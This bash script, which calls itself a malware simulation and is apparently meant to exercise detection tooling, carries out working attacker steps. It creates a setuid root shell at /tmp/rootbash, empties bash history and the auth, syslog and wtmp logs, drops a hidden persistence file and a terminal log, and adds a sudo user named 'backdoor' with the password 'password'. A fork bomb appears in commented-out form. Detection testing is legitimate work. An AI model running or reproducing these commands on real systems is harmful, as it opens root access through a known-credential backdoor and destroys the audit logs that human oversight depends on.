#!/bin/bash

echo "[*] Starting simulated malware execution..."

# 1. GTFOBins Privilege Escalation Attempt (If Sudo Misconfigured)
echo "[*] Attempting GTFOBins privilege escalation..."
sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash
if [ -f /tmp/rootbash ]; then
    echo "[!] Privilege escalation attempt: /tmp/rootbash created."
else
    echo "[*] Privilege escalation blocked."
fi

# 2. Log Tampering
echo "[*] Clearing logs (simulated)"
cat /dev/null > ~/.bash_history
cat /dev/null > /var/log/auth.log 2>/dev/null
cat /dev/null > /var/log/syslog 2>/dev/null
cat /dev/null > /var/log/wtmp 2>/dev/null

# 3. Hidden Persistence Indicator
echo "[*] Creating a hidden persistence file..."
echo "Malware running" > ~/.malware_persistence
chmod 600 ~/.malware_persistence

# 4. Simulated Keylogger (Records Terminal Commands)
echo "[*] Recording terminal activity (simulated keylogger)..."
script -q -c "whoami" /tmp/.keylog

# 5. Adding a Backdoor User (Only Works if Sudo Misconfigured)
echo "[*] Attempting to create a backdoor user..."
if sudo useradd -m backdoor && echo 'backdoor:password' | sudo chpasswd; then
    echo "[!] Backdoor user 'backdoor' created."
else
    echo "[*] Backdoor creation failed (requires misconfigured sudo)."
fi

# 6. Safe Fork Bomb Prevention (Commented Out)
# echo "[*] Launching fork bomb..."
# bomb() { bomb | bomb & }; bomb
# Uncomment at your own risk! This will exhaust system resources.

echo "[*] Malware simulation complete!"
